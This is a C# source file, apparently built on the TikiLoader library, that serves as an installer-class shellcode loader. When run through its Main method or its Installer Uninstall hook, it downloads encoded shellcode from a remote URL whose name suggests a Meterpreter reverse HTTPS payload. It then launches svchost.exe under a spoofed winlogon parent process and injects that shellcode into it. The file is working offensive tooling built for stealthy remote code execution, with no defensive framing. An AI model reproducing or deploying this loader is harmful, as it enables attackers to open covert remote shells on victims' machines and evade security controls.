using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using TikiLoader;

[ComVisible(true)]

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{

    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Flame(@"C:\Windows\System32\svchost.exe", @"http://host/mtr_rvrs_https_102.tiki");
    }
        public static void Main()
    {
        Flame(@"C:\Windows\System32\svchost.exe", @"http://host/mtr_rvrs_https_102.tiki");
    }
    
    private static byte[] GetShellcode(string url)
    {
        WebClient client = new WebClient();
        client.Proxy = WebRequest.GetSystemWebProxy();
        client.Proxy.Credentials = CredentialCache.DefaultCredentials;
        string compressedEncodedShellcode = client.DownloadString(url);
        return Loader.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
    }

    private static int FindProcessPid(string process)
    {
        int pid = 0;
        int session = Process.GetCurrentProcess().SessionId;
        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;

    }

    private static void Flame(string binary, string url)
    {
        byte[] shellcode = GetShellcode(url);
        string ppid_name = "winlogon";
        int ppid = FindProcessPid(ppid_name);

        if (ppid == 0)
        {
            Console.WriteLine("[x] Couldn't get PPID: " + ppid_name);
            Environment.Exit(1);
        }

        var ldr = new Loader();

        try
        {
            ldr.Load(binary, shellcode, ppid);
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] Something went wrong! " + e.Message);
        }
    }
}
